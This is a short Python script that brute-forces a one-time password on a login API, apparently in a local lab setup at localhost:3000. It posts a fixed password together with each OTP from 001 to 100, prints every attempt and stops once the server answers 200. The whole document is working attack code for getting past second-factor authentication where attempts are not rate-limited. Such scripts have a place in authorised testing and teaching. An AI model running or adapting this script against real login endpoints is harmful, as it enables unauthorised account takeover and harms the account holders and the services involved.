import requests

url = 'http://localhost:3000/api/login'
password = 'letmein'

for i in range(1, 101):
    otp = str(i).zfill(3)
    payload = {
        "password": password,
        "otp": otp
    }

    response = requests.post(url, json=payload)
    print(f"[*] Trying OTP: {otp} - Status: {response.status_code}")

    if response.status_code == 200:
        print(f"✅ Success! OTP was: {otp}")
        break
